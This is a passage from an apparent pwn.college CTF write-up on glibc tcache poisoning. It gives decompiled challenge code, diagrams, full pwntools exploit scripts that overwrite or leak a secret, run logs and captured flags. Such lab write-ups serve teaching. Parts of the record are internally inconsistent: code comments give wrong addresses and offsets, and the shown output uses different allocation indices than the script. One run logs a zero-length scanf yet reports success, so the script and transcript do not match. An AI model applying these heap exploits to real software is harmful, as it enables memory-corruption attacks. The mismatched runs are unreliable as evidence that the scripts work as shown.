p.recvuntil(b"Data: ")
part2 = p.recvline().strip().ljust(8, b"\x00")[:8]
print(f"Part 2: {part2}")
print(p.recvuntil(b"quit): ").decode())

# --- SUBMIT ---
full_secret = part1 + part2
p.sendline(b"send_flag")
p.sendline(full_secret)
print(p.recvuntil(b"}").decode())
```

```
phacker@dynamic-allocator-misuse~seeking-substantial-secrets-hard:/$ python ~/script.py
###
### Welcome to /challenge/seeking-substantial-secrets-hard!
###


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 
Part 1: b'zhffdxpe'

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 
Part 2: b'\x00\x00\x00\x00\x00\x00\x00\x00'

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Secret: 
Authorized!
You win! Here is your flag:
pwn.college{Y1obx4BDBPfdkgWr6FXdTlE7-n5.0FN4MDL4ITM0EzW}
```

&nbsp;

## Seeking Spanless Secrets (Easy)

### Binary Analysis

```c title="/challenge/seeking-spanless-secrets-easy :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  unsigned int v4; // eax
  int i; // [rsp+2Ch] [rbp-124h]
  unsigned int v7; // [rsp+30h] [rbp-120h]
  unsigned int v8; // [rsp+30h] [rbp-120h]
  unsigned int v9; // [rsp+30h] [rbp-120h]
  unsigned int v10; // [rsp+30h] [rbp-120h]
  unsigned int size; // [rsp+34h] [rbp-11Ch]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char choice[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v14; // [rsp+148h] [rbp-8h]

  v14 = __readfsqword(40u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  for ( i = 0; i <= 15; ++i )
    byte_42230A[i] = rand() % 26 + 97;
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 16LL);
  printf("In this challenge, there is a secret stored at %p.\n", byte_42230A);
  puts("This address intentionally uses `whitespace-armoring` (notice the 0x0a in the address).\n");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            print_TCACHE(main_thread_TCACHE);
            puts(byte_4035D1);
            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
            __isoc99_scanf("%127s", choice);
            puts(byte_4035D1);
            if ( strcmp(choice, "malloc") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_4035D1);
            v7 = atoi(choice);
            if ( v7 > 15 )
              __assert_fail("allocation_index < 16", "<stdin>", 279u, "main");
            printf("Size: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_4035D1);
            size = atoi(choice);
            printf("[*] allocations[%d] = malloc(%d)\n", v7, size);
            ptr[v7] = malloc(size);
            printf("[*] allocations[%d] = %p\n", v7, ptr[v7]);
          }
          if ( strcmp(choice, "free") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_4035D1);
          v8 = atoi(choice);
          if ( v8 > 15 )
            __assert_fail("allocation_index < 16", "<stdin>", 297u, "main");
          printf("[*] free(allocations[%d])\n", v8);
          free(ptr[v8]);
        }
        if ( strcmp(choice, "puts") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", choice);
        puts(byte_4035D1);
        v9 = atoi(choice);
        if ( v9 > 15 )
          __assert_fail("allocation_index < 16", "<stdin>", 310u, "main");
        printf("[*] puts(allocations[%d])\n", v9);
        printf("Data: ");
        puts((const char *)ptr[v9]);
      }
      if ( strcmp(choice, "scanf") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", choice);
      puts(byte_4035D1);
      v10 = atoi(choice);
      if ( v10 > 15 )
        __assert_fail("allocation_index < 16", "<stdin>", 323u, "main");
      v3 = malloc_usable_size(ptr[v10]);
      sprintf(choice, "%%%us", v3);
      v4 = malloc_usable_size(ptr[v10]);
      printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, v10);
      __isoc99_scanf(choice, ptr[v10]);
      puts(byte_4035D1);
    }
    if ( strcmp(choice, "send_flag") )
      break;
    printf("Secret: ");
    __isoc99_scanf("%127s", choice);
    puts(byte_4035D1);
    if ( !memcmp(choice, byte_42230A, 16uLL) )
    {
      puts("Authorized!");
      win();
    }
    else
    {
      puts("Not authorized!");
    }
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

### Overwriting the Secret via Tcache Poisoning

Since the secret's address contains a `0x0a` byte, `scanf` would stop reading before completing the full 8-byte address, so we can't directly poison the `next` pointer to point at `secret_addr`. Instead, we target a nearby aligned address (`secret_addr - 16`) that contains no whitespace bytes, and use padding to bridge the gap.

Let's say we allocate two chunks `A`, `B` of memory and then free them:

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│    next: &B      │ ────╮
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
         ╭───────────────╯
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry B  ┆
├──────────────────┤
│    next: NULL    │
├──────────────────┤
│    key: Void     │
└──────────────────┘
```

We then use `scanf` on the dangling pointer at index `0` (chunk `A`) to overwrite its `next` pointer with `target_addr = secret_addr - 16`. This address has no whitespace bytes, so `scanf` can write it in full:

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│ next: target_adr │ ────╮
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐     │   (B is now orphaned, A skips over it)
┆  TCACHE_entry B  ┆     │
├──────────────────┤     │
│    next: NULL    │     │
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
         ╭───────────────╯
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  DATA SEGMENT (target_addr)    ┆
├────────────────────────────────┤
│  [16 bytes before secret_addr] │
│          ...garbage...         │
└────────────────────────────────┘
```

Now we call `malloc` twice. The first allocation returns chunk `A` (a real heap chunk), and the second returns `target_addr`, a pointer into the program's data segment 16 bytes before the secret:

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_16: 0    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_16: NULL ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆ (allocated as ptr[0])
├──────────────────┤
│  ..............  │
├──────────────────┤
│       NULL       │
└──────────────────┘


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  DATA SEGMENT (target_addr)    ┆ (allocated as ptr[1])
├────────────────────────────────┤
│  [16 bytes before secret_addr] │
│          ...garbage...         │
│          secret_addr >>>       │ <-- secret lives here, 16 bytes in
└────────────────────────────────┘
```

We now have a writable pointer (`ptr[1]`) that starts 16 bytes before `secret_addr`. We call `scanf` on `ptr[1]` and send 16 bytes of padding followed by our chosen 16-byte secret value, which overwrites the original random secret with something we know:

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  DATA SEGMENT (target_addr)    ┆
├────────────────────────────────┤
│  BBBBBBBBBBBBBBBB (16 padding) │ <-- bytes before secret_addr
├────────────────────────────────┤
│  AAAAAAAAAAAAAAAA (16 secret)  │ <-- secret_addr, now overwritten
└────────────────────────────────┘
```

Finally, we call `send_flag` and submit our known value (`AAAAAAAAAAAAAAAA`). Since we wrote it ourselves, we know exactly what to send without ever needing to leak the original.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/seeking-spanless-secrets-easy")

# Setup our target and math
# Secret is at 0x42230a
# target_addr is 0x4222f0 (Aligned and no 0x0a whitespace)
secret_addr = 0x42230a
target_addr = secret_addr - 16
offset = secret_addr - target_addr # 26 bytes
new_secret = b"A" * 16

# Build payload
payload = b"B" * offset
payload += new_secret

print(f"[*] Targeting aligned address: {hex(target_addr)}")

# Allocate two chunks
p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

# Free them to populate Tcache
p.sendline(b"free")
p.sendline(b"1")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"free")
p.sendline(b"0")
print(p.recvuntil(b"quit): ").decode())

# Poison the 'next' pointer
p.sendline(b"scanf")
p.sendline(b"0")
p.sendline(p64(target_addr))
print(p.recvuntil(b"quit): ").decode())

# Malloc twice to get the chunk at our target address
p.sendline(b"malloc")
p.sendline(b"0") 
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"1") 
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

# Overwrite the secret area
# Junk padding + our controlled secret
p.sendline(b"scanf")
p.sendline(b"1")
p.sendline(payload)
print(p.recvuntil(b"quit): ").decode())

# Send the flag with our known secret
p.sendline(b"send_flag")
p.sendline(new_secret)

# Print final result
print(p.recvuntil(b"}").decode())
```

```
hacker@dynamic-allocator-misuse~seeking-spanless-secrets-easy:/$ python ~/script.py
[+] Starting local process '/challenge/seeking-spanless-secrets-easy': pid 8821
[*] Targeting aligned address: 0x4222fa
###
### Welcome to /challenge/seeking-spanless-secrets-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.

In this challenge, there is a secret stored at 0x42230a.
This address intentionally uses `whitespace-armoring` (notice the 0x0a in the address).


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 
[*] allocations[0] = malloc(128)
[*] allocations[0] = 0x15a6a2c0

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 
[*] allocations[1] = malloc(128)
[*] allocations[1] = 0x15a6a350

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
[*] free(allocations[1])
+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x15a6a350           | KEY: 0x15a6a010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x15a6a350          | 0                   | 0x91 (P)                     | (nil)               | 0x15a6a010          |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 2     | HEAD: 0x15a6a2c0           | KEY: 0x15a6a010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x15a6a2c0          | 0                   | 0x91 (P)                     | 0x15a6a350          | 0x15a6a010          |
| 0x15a6a350          | 0                   | 0x91 (P)                     | (nil)               | 0x15a6a010          |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
[*] scanf("%136s", allocations[0])

+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 2     | HEAD: 0x15a6a2c0           | KEY: 0x15a6a010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x15a6a2c0          | 0                   | 0x91 (P)                     | 0x4222fa            | 0x15a6a000          |
| 0x4222fa            | 0                   | 0 (NONE)                     | (nil)               | (nil)               |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 
[*] allocations[2] = malloc(128)
[*] allocations[2] = 0x15a6a2c0
+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x4222fa             | KEY: 0x15a6a010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x4222fa            | 0                   | 0 (NONE)                     | (nil)               | (nil)               |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 
[*] allocations[3] = malloc(128)
[*] allocations[3] = 0x4222fa

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
[*] scanf("%0s", allocations[3])


[*] Function (malloc/free/puts/scanf/send_flag/quit): 
Secret: 
Authorized!
You win! Here is your flag:
pwn.college{UXoETFJzikCNvh66nGl1nVtHrJT.0VN4MDL4ITM0EzW}
```

&nbsp;

## Seeking Spanless Secrets (Hard)

### Binary Analysis

```c title="/challenge/seeking-spanless-secrets-hard :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int i; // [rsp+2Ch] [rbp-124h]
  unsigned int v6; // [rsp+30h] [rbp-120h]
  unsigned int v7; // [rsp+30h] [rbp-120h]
  unsigned int v8; // [rsp+30h] [rbp-120h]
  unsigned int v9; // [rsp+30h] [rbp-120h]
  unsigned int size; // [rsp+34h] [rbp-11Ch]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char choice[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v13; // [rsp+148h] [rbp-8h]

  v13 = __readfsqword(40u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  for ( i = 0; i <= 15; ++i )
    byte_42580A[i] = rand() % 26 + 97;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            puts(byte_40214C);
            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
            __isoc99_scanf("%127s", choice);
            puts(byte_40214C);
            if ( strcmp(choice, "malloc") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_40214C);
            v6 = atoi(choice);
            if ( v6 > 15 )
              __assert_fail("allocation_index < 16", "<stdin>", 114u, "main");
            printf("Size: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_40214C);
            size = atoi(choice);
            ptr[v6] = malloc(size);
          }
          if ( strcmp(choice, "free") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_40214C);
          v7 = atoi(choice);
          if ( v7 > 15 )
            __assert_fail("allocation_index < 16", "<stdin>", 130u, "main");
          free(ptr[v7]);
        }
        if ( strcmp(choice, "puts") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", choice);
        puts(byte_40214C);
        v8 = atoi(choice);
        if ( v8 > 15 )
          __assert_fail("allocation_index < 16", "<stdin>", 142u, "main");
        printf("Data: ");
        puts((const char *)ptr[v8]);
      }
      if ( strcmp(choice, "scanf") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", choice);
      puts(byte_40214C);
      v9 = atoi(choice);
      if ( v9 > 15 )
        __assert_fail("allocation_index < 16", "<stdin>", 154u, "main");
      v3 = malloc_usable_size(ptr[v9]);
      sprintf(choice, "%%%us", v3);
      __isoc99_scanf(choice, ptr[v9]);
      puts(byte_40214C);
    }
    if ( strcmp(choice, "send_flag") )
      break;
    printf("Secret: ");
    __isoc99_scanf("%127s", choice);
    puts(byte_40214C);
    if ( !memcmp(choice, byte_42580A, 16uLL) )
    {
      puts("Authorized!");
      win();
    }
    else
    {
      puts("Not authorized!");
    }
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/seeking-spanless-secrets-hard")

# Setup our target and math
# Secret is at 0x42580a
# target_addr is 0x4257fa (Aligned and no 0x0a whitespace)
secret_addr = 0x42580a
target_addr = secret_addr - 16
offset = secret_addr - target_addr # 26 bytes
new_secret = b"A" * 16

# Build payload
payload = b"B" * offset
payload += new_secret

print(f"[*] Targeting aligned address: {hex(target_addr)}")

# Allocate two chunks
p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

# Free them to populate Tcache
p.sendline(b"free")
p.sendline(b"1")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"free")
p.sendline(b"0")
print(p.recvuntil(b"quit): ").decode())

# Poison the 'next' pointer
p.sendline(b"scanf")
p.sendline(b"0")
p.sendline(p64(target_addr))
print(p.recvuntil(b"quit): ").decode())

# Malloc twice to get the chunk at our target address
p.sendline(b"malloc")
p.sendline(b"0") 
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"1") 
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

# Overwrite the secret area
# Junk padding + our controlled secret
p.sendline(b"scanf")
p.sendline(b"1")
p.sendline(payload)
print(p.recvuntil(b"quit): ").decode())

# Send the flag with our known secret
p.sendline(b"send_flag")
p.sendline(new_secret)

# Print final result
print(p.recvuntil(b"}").decode())
```

```
hacker@dynamic-allocator-misuse~seeking-spanless-secrets-hard:/$ python ~/script.py
[+] Starting local process '/challenge/seeking-spanless-secrets-hard': pid 1368
[*] Targeting aligned address: 0x4257fa
###
### Welcome to /challenge/seeking-spanless-secrets-hard!
###


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 


[*] Function (malloc/free/puts/scanf/send_flag/quit): 
Secret: 
Authorized!
You win! Here is your flag:
pwn.college{s3p743_G7uUAFBNkhZiOvvnjaAR.0lN4MDL4ITM0EzW}
```

&nbsp;

## Seeking Smuggled Secrets (Easy)

```
hacker@dynamic-allocator-misuse~seeking-smuggled-secrets-easy:/$ /challenge/seeking-smuggled-secrets-easy
###
### Welcome to /challenge/seeking-smuggled-secrets-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.

In this challenge, there is a secret stored at 0x429360.
If you attempt to malloc an address near where the secret is stored, it will be discarded.


[*] Function (malloc/free/puts/scanf/send_flag/quit):
```

### Binary Analysis

```c title="/challenge/seeking-smuggled-secrets-easy :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  unsigned int v4; // eax
  int i; // [rsp+2Ch] [rbp-124h]
  unsigned int v7; // [rsp+30h] [rbp-120h]
  unsigned int v8; // [rsp+30h] [rbp-120h]
  unsigned int v9; // [rsp+30h] [rbp-120h]
  unsigned int v10; // [rsp+30h] [rbp-120h]
  unsigned int size; // [rsp+34h] [rbp-11Ch]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char choice[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v14; // [rsp+148h] [rbp-8h]

  v14 = __readfsqword(40u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  for ( i = 0; i <= 15; ++i )
    byte_429360[i] = rand() % 26 + 97;
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 16LL);
  printf("In this challenge, there is a secret stored at %p.\n", byte_429360);
  puts("If you attempt to malloc an address near where the secret is stored, it will be discarded.\n");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            print_TCACHE(main_thread_TCACHE);
            puts(byte_4035D4);
            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
            __isoc99_scanf("%127s", choice);
            puts(byte_4035D4);
            if ( strcmp(choice, "malloc") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_4035D4);
            v7 = atoi(choice);
            if ( v7 > 15 )
              __assert_fail("allocation_index < 16", "<stdin>", 279u, "main");
            printf("Size: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_4035D4);
            size = atoi(choice);
            printf("[*] allocations[%d] = malloc(%d)\n", v7, size);
            ptr[v7] = malloc(size);
            if ( ptr[v7] >= (char *)&secret + 65536 )
            {
              printf("[*] allocations[%d] = %p\n", v7, ptr[v7]);
            }
            else
            {
              puts("Invalid allocation detected: discarded!");
              ptr[v7] = 0LL;
            }
          }
          if ( strcmp(choice, "free") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_4035D4);
          v8 = atoi(choice);
          if ( v8 > 15 )
            __assert_fail("allocation_index < 16", "<stdin>", 303u, "main");
          printf("[*] free(allocations[%d])\n", v8);
          free(ptr[v8]);
        }
        if ( strcmp(choice, "puts") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", choice);
        puts(byte_4035D4);
        v9 = atoi(choice);
        if ( v9 > 15 )
          __assert_fail("allocation_index < 16", "<stdin>", 316u, "main");
        printf("[*] puts(allocations[%d])\n", v9);
        printf("Data: ");
        puts((const char *)ptr[v9]);
      }
      if ( strcmp(choice, "scanf") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", choice);
      puts(byte_4035D4);
      v10 = atoi(choice);
      if ( v10 > 15 )
        __assert_fail("allocation_index < 16", "<stdin>", 329u, "main");
      if ( (unsigned int)malloc_usable_size(ptr[v10]) )
      {
        v3 = malloc_usable_size(ptr[v10]);
        sprintf(choice, "%%%us", v3);
        v4 = malloc_usable_size(ptr[v10]);
        printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, v10);
        __isoc99_scanf(choice, ptr[v10]);
        puts(byte_4035D4);
      }
    }
    if ( strcmp(choice, "send_flag") )
      break;
    printf("Secret: ");
    __isoc99_scanf("%127s", choice);
    puts(byte_4035D4);
    if ( !memcmp(choice, byte_429360, 16uLL) )
    {
      puts("Authorized!");
      win();
    }
    else
    {
      puts("Not authorized!");
    }
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

The goal is to leak the 16-byte secret stored at `byte_429360` and pass it to `send_flag`. The interesting part of this binary is the guard check that fires after every `malloc`:

```c title="/challenge/seeking-smuggled-secrets-easy :: main() :: Pseudocode" showLineNumbers
# ---- snip ----

ptr[v7] = malloc(size);
if ( ptr[v7] >= (char *)&secret + 65536 )
{
  printf("[*] allocations[%d] = %p\n", v7, ptr[v7]);
}
else
{
  puts("Invalid allocation detected: discarded!");
  ptr[v7] = 0LL;
}

# ---- snip ----
```

If the returned pointer falls below `secret_addr + 0x10000`, the program nullifies `ptr[idx]`, so we never get a direct handle to the secret. The straightforward approach of pointing an allocation at `secret_addr` and calling `puts` on it is closed off.

A correct implementation would have validated **before** calling `malloc`:

```c title="/challenge/seeking-smuggled-secrets-easy :: main() :: Pseudocode" showLineNumbers
# ---- snip ----

// CORRECT: check what TCACHE is about to return before popping it
TCACHE_entry *next = TCACHE->entries[tc_idx];
if ( next < (char *)&secret + 65536 )
{
  puts("Invalid allocation detected: rejected!");
  continue;
}

ptr[v7] = malloc(size);

# ---- snip ----
```

But this program checks the **result** of `malloc` after the fact. By then the TCACHE has already popped `secret_addr` and advanced its internal `entries[idx]` field. The guard closes the door, but the horse has already bolted, and that side effect is exactly what we will exploit.

### Leaking via Stale Tcache HEAD

The TCACHE's `entries[]` array and `counts[]` array are independent. When `malloc` pops the last chunk from a bin, glibc does this:

```c
*entries = REVEAL_PTR(e->next);   // entries[idx] = whatever was in popped chunk's next
--(TCACHE->counts[tc_idx]);        // count drops to 0
```

